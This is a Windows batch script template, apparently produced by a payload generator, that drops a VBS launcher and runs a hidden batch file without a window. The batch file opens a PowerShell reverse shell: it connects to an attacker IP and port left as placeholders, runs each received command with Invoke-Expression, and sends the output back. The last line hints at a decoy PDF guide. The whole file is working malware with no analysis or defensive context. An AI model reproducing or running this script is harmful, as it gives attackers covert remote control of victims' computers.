@echo off
setlocal

set "attackerIP={ip}"
set "attackerPort={port}"

:: Batch script content starts here
echo Set objShell = CreateObject("WScript.Shell")>temp.vbs
echo objShell.Run "cmd /c hidden.bat", 0, False>>temp.vbs
echo Set objShell = Nothing>>temp.vbs

:: Replace "hidden.bat" with your batch script's name
echo @echo off>hidden.bat
echo set "attackerIP={ip}">>hidden.bat
echo set "attackerPort={port}">>hidden.bat
echo powershell -c "$client = New-Object System.Net.Sockets.TCPClient('%attackerIP%', %attackerPort%);$stream = $client.GetStream();$reader = [System.IO.StreamReader]::new($stream);$writer = [System.IO.StreamWriter]::new($stream);while($true){$line = $reader.ReadLine();$cmd = (Invoke-Expression -Command $line 2>&1 | Out-String);$writer.WriteLine($cmd);$writer.Flush()};$client.Close()" >>hidden.bat
:: End of batch script content
:end

cscript //nologo temp.vbs
del temp.vbs & BufferOverflowGuide.pdf
